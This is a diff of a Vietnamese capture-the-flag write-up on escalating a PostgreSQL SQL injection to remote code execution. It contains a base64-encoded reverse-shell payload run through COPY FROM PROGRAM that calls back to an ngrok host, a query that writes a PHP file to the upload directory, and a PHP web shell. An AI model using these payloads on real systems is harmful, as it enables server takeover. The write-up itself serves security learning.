@@ -93,10 +93,10 @@ Nhưng, trong câu truy vấn gốc với mệnh đề select thì ta không là
 
 Vậy là confirm rằng psql có support Stacked Queries.
 
-### Giả thiết 1: Execute OS command via SQL
+### Vector 1: Execute OS command via SQL
 Sau một hồi research docs của postgresql, tui tìm được [cái này](https://www.postgresql.org/docs/current/sql-copy.html#:~:text=the%20path%20name.-,PROGRAM,string%2C%20or%20at%20least%20avoid%20including%20any%20user%20input%20in%20it.,-STDIN){:target="\_blank"}.
  
- `COPY FROM PROGRAM` giúp ta thực hiện giả thiết 1 mà tui đưa ra. 
+ `COPY FROM PROGRAM` giúp ta thực hiện vector 1 mà tui đưa ra. 
 
 - Bắt đầu với việc tạo 1 table.
 ```text
@@ -127,7 +127,7 @@ export RHOST="0.tcp.ap.ngrok.io";export RPORT=19890;python3 -c 'import sys,socke
 '; COPY shell FROM PROGRAM 'echo "ZXhwb3J0IFJIT1NUPSIwLnRjcC5hcC5uZ3Jvay5pbyI7ZXhwb3J0IFJQT1JUPTE5ODkwO3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn" | base64 -d | /bin/bash';-- -
 ```
 
-### Giả thiết 2: Upload shell via SQL
+### Vector 2: Upload shell via SQL
 
 - Thứ nhất, điều kiện tiên quyết là upload ở đâu đó trong document-root để có thể thực thi file php? 
 - Và thư mục đó có quyền ghi cho user postgres hay không?
@@ -145,9 +145,9 @@ Thư mục upload
 ![upload](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/9.png)
 
 
-Thư mục upload/ và document_root là 2 clues chính cho giả thiết 2 này. 
+Thư mục upload/ và document_root là 2 keys chính cho giả thiết 2 này. 
 
-Việc còn lại là craft 1 payload để ghi file, cụ thể hơn là file php (để chứng minh thư mục đó có thực thi file php hay không).
+Việc còn lại là craft 1 payload để ghi file, cụ thể hơn là file php (để chứng minh thư mục file php có được thực thi hay không).
 
 ```
 '; CREATE TEMPORARY TABLE temp_results(a VARCHAR(255)); INSERT INTO temp_results (a) VALUES ('<?php phpinfo(); ?>'); COPY temp_results TO '/www/upload/1.php' WITH (FORMAT CSV);-- -
@@ -156,8 +156,8 @@ Việc còn lại là craft 1 payload để ghi file, cụ thể hơn là file p
 ![test payload](/assets/img/posts/Baby-SQL-Injection-to-RCE-CookieArena/10.png)
 
 Giải thích payload:
-- Tạo 1 bảng tạm có 1 column để insert payload.
-- `COPY temp_results TO '/www/upload/1.php' WITH (FORMAT CSV);` câu lệnh giúp xuất toàn bộ content của table `temp_results` vào 1 file trong hệ thống với absolute path (nếu cố tình chèn relative path sẽ gây ra lỗi), điều này chứng minh rằng document_root là thông tin cần thiết.
+- Tạo 1 bảng tạm có 1 column để chèn payload.
+- `COPY temp_results TO '/www/upload/1.php' WITH (FORMAT CSV);` câu lệnh giúp xuất toàn bộ content của table `temp_results` chứa payload vào 1 file trong hệ thống với absolute path (nếu cố tình chèn relative path sẽ gây ra lỗi) (đó cũng chứng minh rằng document_root là thông tin cần thiết cho vector này).
 
 Thay payload phpinfo() bằng `<?php system($_GET[cmd]); ?>');` => RCE
 
